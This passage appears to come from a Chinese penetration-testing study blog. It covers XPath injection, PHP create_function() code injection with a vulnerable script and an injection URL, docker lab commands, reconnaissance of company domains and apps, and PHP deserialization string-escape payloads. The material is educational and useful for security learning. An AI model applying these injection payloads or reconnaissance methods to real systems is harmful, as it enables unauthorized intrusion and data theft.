<h2 id="为什么-出现两次"><a href="#为什么-出现两次" class="headerlink" title="为什么&#x2F;&#x2F;*出现两次"></a>为什么&#x2F;&#x2F;*出现两次</h2><p>XPath表达式中的 <code>//*</code>​ 两次出现的原因是为了选择XML文档中的所有元素节点，不论它们的位置。让我进一步解释这两个 <code>//*</code>​ 的作用：</p>
<ol>
<li>第一个 <code>//*</code>​：第一个 <code>//*</code>​ 表达式选择文档中的所有元素节点。它从文档的根节点开始，递归地选择所有子元素，不论它们在文档的哪个位置。</li>
<li>第二个 <code>//*</code>​：第二个 <code>//*</code>​ 表达式也选择文档中的所有元素节点，与第一个 <code>//*</code>​ 表达式一样。然而，它不仅选择了根节点的子元素，还选择了它们的后代元素。</li>
</ol>
<p>这两个 <code>//*</code>​ 表达式的组合确保了选择了文档中的所有元素节点，包括根节点下的所有元素以及这些元素的后代元素。这种选择方式是为了确保不会漏掉任何元素节点，而且它在XPath中是一种通用的选择方式，用于查找文档中的所有元素节点。</p>
<p>攻击者通常使用这种类型的XPath注入来绕过访问控制或者检索文档中的敏感数据，因为它能够选择文档中的所有元素。应用程序的开发人员应该小心处理用户提供的XPath查询，以避免出现不安全的查询，尤其是在没有适当验证和过滤用户输入的情况下。</p>
<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>create_function()代码注入</title>
    <url>/2023/10/23/create-function-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="create-function-代码注入"><a href="#create-function-代码注入" class="headerlink" title="create_function() 代码注入"></a>create_function() 代码注入</h1><h4 id="第一部分：php函数-create-function-介绍"><a href="#第一部分：php函数-create-function-介绍" class="headerlink" title="第一部分：php函数 create_function() 介绍"></a>第一部分：php函数 create_function() 介绍</h4><p><strong>理论：</strong></p>
<p>create_function()主要用来创建匿名函数,有时候匿名函数可以发挥它的作用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> create_function    ( <span class="keyword">string</span> <span class="variable">$args  </span> , <span class="keyword">string</span> <span class="variable">$code  </span> )</span><br></pre></td></tr></table></figure>

<p>string $<a href="https://so.csdn.net/so/search?q=args&spm=1001.2101.3001.7020">args</a> 变量部分</p>
<p>string $code 方法代码部分</p>
<p><strong>举例：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$fname&#x27;</span>,<span class="string">&#x27;echo $fname.&quot;Zhang&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>类似于：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span>(<span class="params"><span class="variable">$fname</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$fname</span>.<span class="string">&quot;Zhang&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>举一个官方提供的例子：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$newfunc</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;New anonymous function: <span class="subst">$newfunc</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$newfunc</span>(<span class="number">2</span>, M_E) . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"><span class="comment">// outputs</span></span><br><span class="line"><span class="comment">// New anonymous function: lambda_1</span></span><br><span class="line"><span class="comment">// ln(2) + ln(2.718281828459) = 1.6931471805599</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="第二部分：如何利用-create-function-代码注入"><a href="#第二部分：如何利用-create-function-代码注入" class="headerlink" title="第二部分：如何利用 create_function() 代码注入"></a>第二部分：如何利用 create_function() 代码注入</h4><p><strong>测试环境版本：</strong></p>
<p>apache +php 5.2、apache +php 5.3</p>
<p><strong>有问题的代码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//02-8.php?id=2;&#125;phpinfo();/*</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="string">&#x27;echo  &#x27;</span>.<span class="variable">$a</span>.<span class="string">&#x27;test&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;==============================&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$f1</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;==============================&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>漏洞利用：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/02-8.php?id=2;&#125;phpinfo();/*</span><br></pre></td></tr></table></figure>

<p><strong>执行函数为：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">源代码：</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>.<span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">注入后代码：</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fT</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>;&#125;</span><br><span class="line">  <span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*;//此处为注入代码。</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>docker基本使用</title>
    <url>/2023/10/23/docker/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h1><p><strong>启动docker</strong></p>
<p>systemctl start docker</p>
<p><strong>拉取镜像</strong></p>
<p>docker pull ….</p>
<p><strong>查看镜像</strong></p>
<p>docker images</p>
<p><strong>启动镜像</strong></p>
<p>docker run -dit -p 80:80 mattrayner&#x2F;lamp</p>
<p><strong>查看容器</strong></p>
<p>docker ps -a</p>
<p><strong>关闭容器</strong></p>
<p>docker stop …</p>
<p><strong>开启容器</strong></p>
<p>docker start …</p>
<p><strong>删除容器</strong></p>
<p>docker rm -f …</p>
<p><strong>删除镜像(需要先删除容器)</strong></p>
<p>docker rmi …</p>
<p><strong>docker-compose启动靶场</strong></p>
<p>docker-compose up -d</p>
<p><strong>docker-compse关闭靶场</strong></p>
<p>docker-compose down</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>信息收集1</title>
    <url>/2023/10/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>信息资产收集是渗透测试的关键、也是渗透测试的成功保障 （知⼰知彼，百战百胜）</p>
<h2 id="1-企业信息收集之域名信息收集"><a href="#1-企业信息收集之域名信息收集" class="headerlink" title="1.企业信息收集之域名信息收集"></a>1.企业信息收集之域名信息收集</h2><h3 id="1-通过域名找到公司"><a href="#1-通过域名找到公司" class="headerlink" title="1.通过域名找到公司"></a>1.通过域名找到公司</h3><h4 id="1-ICP备案"><a href="#1-ICP备案" class="headerlink" title="1).ICP备案"></a>1).ICP备案</h4><p>什么是ICP备案</p>
<p>《⾮经营性互联⽹信息服务备案管理办法》于2005年3⽉20⽇起施⾏。</p>
<p>办法指出在中华⼈⺠共和国境内提供⾮经营性互联⽹信息服务，应当依法履⾏备案⼿续。</p>
<h4 id="2-ICP备案查询：https-icp-chinaz-com"><a href="#2-ICP备案查询：https-icp-chinaz-com" class="headerlink" title="2).ICP备案查询：https://icp.chinaz.com/"></a>2).ICP备案查询：<a href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></h4><img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230809100731-zuzahsm.png" class="" title="image">​

<h4 id="3-Whois"><a href="#3-Whois" class="headerlink" title="3).Whois"></a>3).Whois</h4><p>Whois 是⽤来查询域名的IP以及所有者等信息的传输协议。简单说，whois就是⼀个⽤来查询域名是否</p>
<p>已经被注册，以及注册域名的详细信息的数据库（如域名所有⼈、域名注册商）。</p>
<p>由于境外的⽹站不需要icp备案，⽆法通过备案信息进⾏查询，故⽽可以使⽤whois查询</p>
<p><a href="https://www.ggcx.com/main/whois">https://www.ggcx.com/main/whois</a></p>
<img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230809101126-yy1vgzg.png" class="" title="image">​

<h4 id="4-证书指纹"><a href="#4-证书指纹" class="headerlink" title="4).证书指纹"></a>4).证书指纹</h4><p>每个https协议的⽹站都具备SSL证书，证书中可能会包含申请组织，也就是公司的名字</p>
<p>例如 steam 游戏平台官⽹</p>
<img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230809102313-3y32ioo.png" class="" title="image">​

<h3 id="2-通过公司找域名"><a href="#2-通过公司找域名" class="headerlink" title="2.通过公司找域名"></a>2.通过公司找域名</h3><p>通过域名找到公司很简单，其实在很多⽹站上都是⼀⽬了然，⽆需过多了解。</p>
<p>通过公司找到⽹站，就叫做反向查询（反查），例如icp备案反查、whois反查、证书指纹反查。</p>
<h4 id="1-icp备案反查"><a href="#1-icp备案反查" class="headerlink" title="1).icp备案反查"></a>1).icp备案反查</h4><p>备案信息⽹：<a href="https://www.beianx.cn/">https://www.beianx.cn/</a></p>
<img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230809102608-mw3wp7l.png" class="" title="image">​

<p>‍</p>
<p>‍</p>
<h4 id="2-whois注册⼈反查"><a href="#2-whois注册⼈反查" class="headerlink" title="2).whois注册⼈反查"></a>2).whois注册⼈反查</h4><p>狗狗查询：<a href="https://www.ggcx.com/main/whois">https://www.ggcx.com/main/whois</a></p>
<img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230809102853-9xzuwtw.png" class="" title="image">​

<p><a href="https://www.ggcx.com/main/whoisReverse">https://www.ggcx.com/main/whoisReverse</a></p>
<img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230809102949-eear6k8.png" class="" title="image">​

<h4 id="3-SSL证书指纹反查"><a href="#3-SSL证书指纹反查" class="headerlink" title="3).SSL证书指纹反查"></a>3).SSL证书指纹反查</h4><p>fofa ： <a href="https://fofa.info/">https://fofa.info/</a></p>
<pre><code>cert=&quot;北京奇⻁科技有限公司&quot;
</code></pre>
<img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230809104516-kafgi59.png" class="" title="image">​

<p>hunter ：<a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p>
<pre><code>cert.subject_org=&quot;北京奇⻁科技有限公司&quot;
</code></pre>
<img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230809105126-17bzjp1.png" class="" title="image">​

<h3 id="3-收集每个域名的⼦域名"><a href="#3-收集每个域名的⼦域名" class="headerlink" title="3.收集每个域名的⼦域名"></a>3.收集每个域名的⼦域名</h3><p>什么是⼦域名</p>
<p>例如 baidu.com 是百度的域名， 那么百度搜索[<a href="http://www.baidu.com]">www.baidu.com]</a> 、百度新闻</p>
<p>[news.baidu.com]、百度贴吧[tieba.baidu.com] 就是百度的⼦域名</p>
<p>⼦域名的收集⽅法有很多，例如枚举爆破、DNS查询等。</p>
<p>简单举例：</p>
<pre><code>⾕歌语法 site:baidu.com site:hetianlab.com
</code></pre>
<h2 id="2-企业信息信息收集之移动资产"><a href="#2-企业信息信息收集之移动资产" class="headerlink" title="2.企业信息信息收集之移动资产"></a>2.企业信息信息收集之移动资产</h2><h3 id="1-移动端APP收集"><a href="#1-移动端APP收集" class="headerlink" title="1.移动端APP收集"></a>1.移动端APP收集</h3><h4 id="1）七⻨数据-：-https-www-qimai-cn"><a href="#1）七⻨数据-：-https-www-qimai-cn" class="headerlink" title="1）七⻨数据 ： https://www.qimai.cn/"></a>1）七⻨数据 ： <a href="https://www.qimai.cn/">https://www.qimai.cn/</a></h4><p>查询同开发者应⽤</p>
<img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230809112048-io01kr9.png" class="" title="image">​

<p>公司企业名查询</p>
<img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230809112209-am1w8ge.png" class="" title="image">​

<img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230809112243-gl91n5o.png" class="" title="image">​

<h4 id="2）微信⼩程序收集"><a href="#2）微信⼩程序收集" class="headerlink" title="2）微信⼩程序收集"></a>2）微信⼩程序收集</h4><h4 id="企查查：https-www-qcc-com"><a href="#企查查：https-www-qcc-com" class="headerlink" title="企查查：https://www.qcc.com/"></a>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></h4><img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230809112915-jmsooi4.png" class="" title="image">​

<h4 id="微信⾃带搜索"><a href="#微信⾃带搜索" class="headerlink" title="微信⾃带搜索"></a>微信⾃带搜索</h4><img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230809113219-d6cai5i.png" class="" title="image">​

<p>‍</p>
<h2 id="3-信息收集流程"><a href="#3-信息收集流程" class="headerlink" title="3.信息收集流程"></a>3.信息收集流程</h2><img src="/2023/10/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20230809113436-l45pvrd.png" class="" title="image">​
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
  </entry>
  <entry>
    <title>加密算法与随机数</title>
    <url>/2023/10/23/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E4%B8%8E%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="加密算法与随机数"><a href="#加密算法与随机数" class="headerlink" title="加密算法与随机数"></a>加密算法与随机数</h1><h2 id="1-加密算法"><a href="#1-加密算法" class="headerlink" title="1.加密算法"></a>1.加密算法</h2><h3 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h3><img src="/2023/10/23/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E4%B8%8E%E9%9A%8F%E6%9C%BA%E6%95%B0/image-20231007092726-dnsym9s.png" class="" title="image">​

<img src="/2023/10/23/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E4%B8%8E%E9%9A%8F%E6%9C%BA%E6%95%B0/image-20231007092812-1ayz3qs.png" class="" title="image">​

<img src="/2023/10/23/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E4%B8%8E%E9%9A%8F%E6%9C%BA%E6%95%B0/image-20231007092838-b011pwu.png" class="" title="image">​

<img src="/2023/10/23/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E4%B8%8E%E9%9A%8F%E6%9C%BA%E6%95%B0/image-20231007092957-jxmgsck.png" class="" title="image">​

<img src="/2023/10/23/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E4%B8%8E%E9%9A%8F%E6%9C%BA%E6%95%B0/image-20231007093046-dsr5m5r.png" class="" title="image">​

<img src="/2023/10/23/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E4%B8%8E%E9%9A%8F%E6%9C%BA%E6%95%B0/image-20231007093145-un1tc8w.png" class="" title="image">​

<img src="/2023/10/23/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E4%B8%8E%E9%9A%8F%E6%9C%BA%E6%95%B0/image-20231007093245-prpocv0.png" class="" title="image">​

<img src="/2023/10/23/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E4%B8%8E%E9%9A%8F%E6%9C%BA%E6%95%B0/image-20231007093318-e00eozr.png" class="" title="image">​

<img src="/2023/10/23/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E4%B8%8E%E9%9A%8F%E6%9C%BA%E6%95%B0/image-20231007093601-xrb22xp.png" class="" title="image">​

<img src="/2023/10/23/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E4%B8%8E%E9%9A%8F%E6%9C%BA%E6%95%B0/image-20231007093934-u719zi4.png" class="" title="image">​

<p>‍</p>
<p>‍</p>
<p>‍</p>
]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<p>摘要</p>
<span id="more"></span>

<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>反序列化是将之前序列化的数据重新还原为其原始数据结构或对象的过程。在PHP中，您可以使用<code>unserialize</code>​函数来执行反序列化操作。</p>
<p>以下是一个基本的PHP反序列化示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个关联数组</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;John&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">30</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将数组序列化为字符串</span></span><br><span class="line"><span class="variable">$serializedData</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化字符串以恢复原始数组</span></span><br><span class="line"><span class="variable">$unserializedData</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serializedData</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印反序列化后的数据</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$unserializedData</span>);</span><br></pre></td></tr></table></figure>

<p>在这个示例中，我们首先创建了一个关联数组<code>$data</code>​，然后使用<code>serialize</code>​函数将其序列化为字符串。接下来，我们使用<code>unserialize</code>​函数将字符串反序列化为原始数组，并最后打印出反序列化后的数据。</p>
<p>需要注意的是，反序列化操作具有潜在的安全风险，特别是当您从不受信任的来源接收序列化数据时。恶意用户可以构造特殊的序列化字符串，以触发不安全的操作，例如执行恶意代码。因此，在处理反序列化数据时，务必采取适当的安全措施，例如只接受信任的数据，或使用<code>unserialize</code>​后进行数据验证和过滤。</p>
<p>‍</p>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>在PHP中，当对象被反序列化时，如果对象类中定义了特定的魔术方法，这些魔术方法可以被调用。以下是一些与反序列化相关的魔术方法：</p>
<ol>
<li><code>__wakeup()</code>: 当对象被反序列化时，如果该对象类中定义了<code>__wakeup()</code>​方法，该方法将会在反序列化后被自动调用。您可以在<code>__wakeup()</code>​方法中执行任何必要的初始化或修复操作。</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 在反序列化后执行的操作</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="string">&quot;Data has been unserialized.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serializedData</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">MyClass</span>());</span><br><span class="line"><span class="variable">$unserializedObject</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serializedData</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$unserializedObject</span>-&gt;data; <span class="comment">// 输出 &quot;Data has been unserialized.&quot;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li><code>__construct()</code>: 构造函数(<code>__construct()</code>​)也可以用于在对象被反序列化后进行初始化操作，不过在反序列化时，<code>__construct()</code>​方法通常不会被调用，而是<code>__wakeup()</code>​方法被调用。</li>
<li><code>__sleep()</code>: 在对象被序列化之前，如果对象类中定义了<code>__sleep()</code>​方法，该方法将会在序列化前被自动调用。您可以在<code>__sleep()</code>​方法中指定要序列化的属性列表。</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 返回一个属性名数组，只有这些属性会被序列化</span></span><br><span class="line">        <span class="keyword">return</span> [<span class="string">&#x27;data1&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;data1 = <span class="string">&#x27;Value 1&#x27;</span>;</span><br><span class="line"><span class="variable">$obj</span>-&gt;data2 = <span class="string">&#x27;Value 2&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serializedData</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 只有$data1属性被序列化</span></span><br></pre></td></tr></table></figure>

<p>请注意，<code>__sleep()</code>​和<code>__wakeup()</code>​方法是用于在序列化和反序列化对象时进行自定义操作的重要工具，但也需要小心使用，确保它们不会引入安全漏洞。</p>
<img src="/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231010090251-mth5w93.png" class="" title="image">​

<img src="/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231010090310-fxo9v4v.png" class="" title="image">​

<h2 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h2><p>此类题目的本质就是改变序列化字符串的长度，导致反序列化漏洞<br>这种题目有个共同点：</p>
<ol>
<li>php序列化后的字符串经过了替换或者修改，导致字符串长度发生变化。</li>
<li>总是先进行序列化，再进行替换修改操作。</li>
</ol>
<h3 id="第一种情况：替换修改后导致序列化字符串变长"><a href="#第一种情况：替换修改后导致序列化字符串变长" class="headerlink" title="第一种情况：替换修改后导致序列化字符串变长"></a>第一种情况：替换修改后导致序列化字符串变长</h3><p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$AA</span>=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="comment">// echo serialize($AA).&quot;\n&quot;;$res=filter(serialize($AA));</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>-&gt;pass;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>以上面代码为例，如何在不直接修改<code>$pass</code>​值的情况下间接修改<code>$pass</code>​的值。<br>这段代码的流程是，先序列化代码，然后将里面不希望出现的字符bb替换成自定义的字符串ccc。然后进行<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>，最后输出pass变量。</p>
<p>要解决上面这个问题，先来看一下php序列化代码的特征。</p>
<img src="/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231018091437-35xl8a8.png" class="" title="image">​

<p>我们可以看到，反序列化字符串都是以一<code>&quot;;&#125;</code>​结束的，所以如果我们把<code>&quot;;&#125;</code>​带入需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就丢弃了。<br><strong>在反序列化的时候php会根据s所指定的字符长度去读取后边的字符。如果指定的长度s错误则反序列化就会失败。</strong></p>
<img src="/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231018091620-f0gwuc5.png" class="" title="image">​

<p>此时的name所读取的数据为aaaa”而正常的语法是需要用”;去闭合当前的变量，而因为长度错误所以此时php把闭合的双引号当做了字符串，所以下一个字符就成了分号，没能闭合导致抛出了错误。</p>
<p>把精力回到开头所说的代码，根据刚才讲的，如果我们将name变量中添加bb则程序就会报错，因为bb将被filter函数替换成ccc，ccc的长度比bb多1，这样前面的s所代表的长度为2但是内容却变长了，成了ccc。如下：<br>​<img src="/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231018092237-jpmjmwa.png" class="" title="image">​</p>
<p>可见在序列化后的字符串在经过filter函数过滤前，s为6，内容为aaaabb；经过filter过滤后，s仍然为6，但内容变为了aaaaccc，长度变成了7，根据反序列化读取变量的原则来讲，此时的name能读取到的只是aaaacc，末尾处的那个c是读取不到的，这就形成了一个字符串的逃逸。当我们添加多个bb，每添加一个bb我们就能逃逸一个字符，那我们将逃逸的字符串的长度填充成我们要反序列化的代码长度的话那就可以控制反序列化的结果以及类里面的变量值了。  </p>
<p>假如我们要在name处改为上一个<code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</code>​来间接修改pass的值，如果我们只是单纯的把它加进去的话，就像下面这样：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于<code>$name</code>​被序列化后的长度是固定的，在反序列化后<code>$name</code>​仍然为<code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;&#125;</code>​，<code>$pass</code>​仍然为<code>123456</code>​：</p>
<img src="/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231018093517-jn5wau8.png" class="" title="image">​

<p>这里的关键点在于filter函数，这个函数检测并替换了非法字符串，看似增加了代码的安全系数，实则让整段代码更加危险。filter函数中检测序列化后的字符串，如果检测到了非法字符’bb’，就把它替换为’ccc’。<br>此时我们发现&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;}的长度为27，如果我们再加上27个bb，那最终的长度将增加27，不就能逃逸后面的&quot;;s:4:&quot;pass&quot;;s:6:&quot;hacker&quot;;}了吗？如下：<br>​<img src="/2023/10/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20231018093801-eyi9yz4.png" class="" title="image">​</p>
<p>可见，成功逃逸，成功修改了pass的值。<br>具体分析如下：</p>
